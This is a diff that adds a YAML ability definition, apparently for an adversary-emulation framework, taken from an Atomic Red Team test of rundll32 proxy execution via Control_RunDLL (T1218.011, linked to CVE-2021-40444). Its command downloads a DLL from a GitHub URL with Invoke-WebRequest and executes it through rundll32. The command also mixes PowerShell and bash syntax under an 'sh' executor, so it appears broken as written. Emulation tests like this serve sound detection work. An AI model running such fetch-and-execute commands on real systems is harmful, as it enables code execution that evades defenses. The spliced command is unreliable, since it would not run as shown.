@@ -1,0 +1,48 @@
+- id: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+  name: Rundll32 with Control_RunDLL
+  description: Rundll32.exe loading dll with 'control_rundll' within the command-line,
+    loading a .cpl or another file type related to CVE-2021-40444.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1047\bin\calc.dll") {exit 0}
+          else {exit 1}; then : ; else Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll"
+          -OutFile "PathToAtomicsFolder\T1047\bin\calc.dll"; fi; rundll32.exe shell32.dll,Control_RunDLL
+          "PathToAtomicsFolder\T1047\bin\calc.dll"'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1218.011
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      input_url:
+        description: Url to download the DLL
+        type: url
+        default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+      input_file:
+        description: DLL File
+        type: string
+        default: PathToAtomicsFolder\T1047\bin\calc.dll
+    dependencies:
+    - description: 'DLL file must exist on disk at specified location
+
+        '
+      prereq_command: 'if (Test-Path "#{input_file}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+        '
+    technique_created: '2020-01-23T18:03:46.248Z'
+    atomic_guid: e4c04b6f-c492-4782-82c7-3bf75eb8077e
+    import_timestamp: '2025-06-24T11:14:59.819904Z'
